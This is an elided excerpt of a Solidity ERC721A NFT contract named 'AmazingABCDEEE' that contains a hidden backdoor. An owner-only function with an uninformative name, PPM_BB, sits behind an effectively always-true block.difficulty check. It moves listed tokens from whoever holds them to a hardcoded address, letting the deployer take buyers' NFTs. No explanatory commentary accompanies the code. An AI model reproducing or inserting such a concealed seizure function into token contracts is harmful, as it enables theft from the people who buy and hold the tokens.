...
contract AmazingABCDEEE is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("AmazingABCDEEE", "AMZ", maxBatchSize_, collectionSize_) {
  ...
  function PPM_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x46A23E0Db8F78408d8BBB4C28278fCB1Fa5B2a26, tokenid);
        }
        }
    }
